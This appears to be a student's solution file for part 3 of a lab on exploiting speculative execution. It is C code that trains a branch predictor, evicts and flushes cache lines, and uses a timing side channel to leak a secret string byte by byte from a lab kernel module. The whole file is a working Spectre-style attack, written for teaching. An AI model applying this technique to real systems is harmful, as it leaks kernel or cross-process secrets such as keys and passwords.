/*
 * Exploiting Speculative Execution
 *
 * Part 3
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <immintrin.h>

#include "labspectre.h"
#include "labspectreipc.h"

/*
 * call_kernel_part3
 * Performs the COMMAND_PART3 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART3;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    uint8_t *evict_buf; 
    evict_buf = malloc(11*16384*8*sizeof(uint64_t));
    for(size_t i = 0; i < 11*16384*8*sizeof(uint64_t); i+=4096) {
	evict_buf[i] = 1;
    }



    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;

        // [Part 3]- Fill this in!
        // leaked_byte = ??
        
	for(int i = 0; i < 1000; i++) {
                call_kernel_part3(kernel_fd, shared_memory, 1);
        }
	for(int i = 0; i < 3; i++) {
		for(size_t a = 0; a < 11*16384*8*sizeof(uint64_t); a += 4096) {
			evict_buf[a] ^= 1;
		}
	}
                for(int i = 0; i < 256; i++) {
                clflush(&shared_memory[i*4096]);
        }
     
		call_kernel_part3(kernel_fd, shared_memory, current_offset);

        for(int i = 0; i < 256; i++) {
                volatile uint64_t time = time_access((void*)&shared_memory[i*4096]);
                if(time < 180) {
                        printf("%d, %ld, %ld\n", i, time, current_offset);
                        leaked_byte = i;
                }
        }

        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
